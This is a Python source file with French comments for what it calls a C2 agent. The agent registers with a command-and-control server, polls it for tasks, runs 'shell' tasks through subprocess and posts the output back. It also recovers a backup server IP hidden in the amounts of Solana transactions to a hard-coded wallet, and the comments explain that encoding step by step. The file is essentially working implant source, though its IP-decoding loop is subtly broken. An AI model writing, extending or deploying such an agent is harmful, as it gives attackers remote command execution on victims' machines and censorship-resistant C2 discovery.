import requests
import os
import time
import json
import subprocess

class AgentData:
    """
    Classe représentant les données de l'agent.
    """
    def __init__(self, name: str, hostname: str, ip: str, key: str):
        self.name = name
        self.hostname = hostname
        self.ip = ip
        self.key = key

class Agent:
    """
    Classe représentant l'agent qui s'enregistre et effectue des tâches.
    """
    def __init__(self, agent_data: AgentData, ip: str, port: int):
        self.agent_data = agent_data
        self.ip = ip
        self.port = port
        self.given_name = None
        self.task_url = None
        self.result_url = None

    def register(self):
        """
        Enregistrer l'agent auprès du serveur C2.
        """
        regl = f"http://{self.ip}:{self.port}/register"
        response = requests.post(regl, json=self.agent_data.__dict__)
        if response.status_code == 200:
            self.given_name = response.text.strip()
            self.task_url = f"http://{self.ip}:{self.port}/getTask?agent={self.given_name}"
            self.result_url = f"http://{self.ip}:{self.port}/receiveResult"
            print(f"Agent registered with name: {self.given_name}")
        else:
            print(f"Failed to register agent: {response.status_code}")

    def wait_for_task(self):
        """
        Boucle infinie pour vérifier les tâches et les traiter.
        """
        while True:
            time.sleep(3)
            task_response = requests.get(self.task_url)
            if task_response.status_code == 204:
                print("No task available.")
            else:
                print(f"Task received: {task_response.text}")
                self.handle_task(task_response.text)

    def handle_task(self, task):
        """
        Traiter la tâche reçue.
        """
        # Implémentation de la logique pour gérer la tâche reçue
        print(f"Handling task: {task}")
        task = task.split(":")
        if task[0] == "shell":
            result = subprocess.run([task[1]], capture_output=True, text=True)
            result = result.stdout
            self.send_task(result)  
        
    def send_task(self,result):
        payload = {
            "agent" : self.agent_data.name,
            "result" : result
            }
        headers = {"Content-Type" : "application/json"}
        task_result = requests.post(self.result_url, json=payload, headers=headers)
        print(task_result.status_code)


    def retrieve_transaction(self, wallet_addr):
        """
        Cette fonction retrouve les signatures des deux dernières transactions sur la wallet.
        """
        signature_list = []
        data = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getSignaturesForAddress",
            "params": [
                wallet_addr,
                {
                    "limit": 2
                }
            ]
        }
        res = requests.post(url="https://api.mainnet-beta.solana.com",json=data)
        json_res = res.json()
        for i in json_res['result']:
            signature_list.append(i['signature'])

        return signature_list
    
    def retrieve_backup_ip(self, signature_list):
        """
        Cette fonction utilise les signatures de deux dernières transactions,
        pour retrouver les sommes envoyées sur le wallet.
        """
        ip_address = ""

        i = 0 
        for signature in signature_list:
            data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTransaction",
                "params" : [
                    signature,
                    {
                        "commitment": "confirmed",
                        "maxSupportedTransactionVersion": 0,
                        "encoding" : "json"
                    }
                ]
            }
        res = requests.post(url="https://api.mainnet-beta.solana.com", json=data)
        json_res = res.json()
        amount_send = json_res['result']['meta']['postBalances'][1] - json_res['result']['meta']['preBalances'][1]
        # Ici la somme envoyée est convertit en hexadecimal de 2 octets 
        # Une adresse IP fait 4 octets. Donc deux transactionss suffisent à reconstituer l'IP
        # Solana affiche la balance en "Lamports", cad la quantité de solana x 1 milliard
        # Description de la technique :
        # IP : 120.45.89.12
        # hex (120) --> 0x78
        # hex(45) --> 0x2d
        # hex(89) --> 0x59
        # hex(12) --> 0x0c
        # Pour créer la première partie de l'IP on concatene 0x78 et 0x2d --> 0x782d.
        # On XOR 0x782d par 0xffff afin d'avoir uniquement des nombres à 5 chiffres
        # 0x782d une fois XORE donne 34770 en decimal, nous allons donc envoyer 0.034770 au wallet.
        # Quand nous récupérerons la transaction que nous regardons la somme reçu nous voyons
        # 34770000, nous voulons récupérer la partie 34770 donc on divise par 1000.
        # On convertit ce nombre en héxadécimal qui donne (0x782d ^ 0xffff), on rexore avec 0xffff ce nombre
        # pour nous redonner 0x782D
        # On casse en deux 0x782d, on retrouve 0x78 --> 120 et 0x2d --> 45
        # dans une transaction solana nous n'avons pas directement la somme envoyée, mais uniquement
        # la somme présente sur le wallet avant et après la transaction donc on fait postBalances - preBalances
        # De plus, j'ai remarque que si le morceau d'adresse IP convertit en hexadecimal donne un nombre comme 2100
        # on doit changer la division , sauf que l'argent ne peut pas savoir si nous voulions envoyer 21 ou 2100 ou 21000
        # Donc on convertit tout en nombre à 5 chiffres avec XOR 0xffff
        ip_byte = hex(amount_send // 1000)
        ip_byte = hex(int(ip_byte,16) ^ 0xffff)
        ip_address = ip_address + str(int(ip_byte[:4], 16)) + "."
        if i == 0:
            ip_address = ip_address + str(int(ip_byte[4:6], 16)) + "."
        else:
            ip_address = ip_address + str(int(ip_byte[4:6], 16))
        
        i += 1

        return ip_address

       
def main():
    wallet_addr = "2Hj5EwbGDRjsE6xHjtJcAmhDVqAgWzVrv9DkAJqWnint"
    ip = "127.0.0.1"
    port = 4444

    # Récupérer le nom de l'hôte de la machine
    hostname = os.uname()[1]

    # Créer l'instance de l'agent avec ses données
    agent_data = AgentData(name="raph", hostname=hostname, ip="1.1.1.1", key="1234")
    agent = Agent(agent_data, ip, port)

    # Enregistrer l'agent
    agent.register()

    signature_list = agent.retrieve_transaction(wallet_addr)
    print(signature_list)
    backup_ip = agent.retrieve_backup_ip(signature_list)
    print(backup_ip)

    # Attendre et gérer les tâches
    agent.wait_for_task()





if __name__ == "__main__":
    main()

